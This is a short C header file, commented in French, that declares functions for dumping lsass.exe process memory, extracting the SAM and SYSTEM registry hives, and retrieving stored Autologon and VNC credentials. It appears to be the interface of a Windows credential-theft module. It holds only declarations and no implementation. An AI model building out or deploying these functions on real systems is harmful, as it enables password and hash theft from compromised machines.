#ifndef LSASS_H
#define LSASS_H

#include <windows.h>

/*
 * Dump la mémoire de lsass.exe.
 * Nécessite SeDebugPrivilege (droits admin).
 * L'appelant doit libérer outData.
 */
BOOL Lsass_Dump(BYTE** outData, DWORD* outSize);

/*
 * Extrait la ruche SAM du registre.
 * Nécessite des privilèges élevés.
 */
BOOL Registry_DumpSAM(BYTE** outData, DWORD* outSize);

/*
 * Extrait la ruche SYSTEM du registre.
 * Nécessite des privilèges élevés.
 */
BOOL Registry_DumpSYSTEM(BYTE** outData, DWORD* outSize);

/*
 * Extrait les credentials stockés dans le registre.
 * (Autologon, VNC, etc.)
 */
BOOL Registry_GetStoredCredentials(char** outJson);

#endif // LSASS_H
